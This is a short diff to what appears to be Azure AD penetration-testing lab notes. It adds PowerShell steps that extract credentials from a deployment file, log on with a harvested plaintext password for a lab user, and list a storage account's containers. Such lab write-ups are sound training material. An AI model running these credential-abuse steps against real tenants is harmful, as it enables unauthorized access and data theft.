@@ -1094,3 +1094,19 @@ Use the below command to quickly look for credentials:
 ```
 (cat C:\AzAD\Tools\stevencking_defcorphq.onmicrosoft.com.sapsrv.json |ConvertFrom-Json |select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
 ```
+New credentials!
+
+#### Stephen King
+
+
+lets logon as stephen:
+```
+$password = ConvertTo-SecureString 'St3v3nc@nReadStorAg3@ccounts987' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('stevencking@defcorphq.onmicrosoft.com', $password)
+Connect-AzAccount -Credential $creds
+```
+
+we see a storage blob, lets see whats inside:
+```
+Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
+```
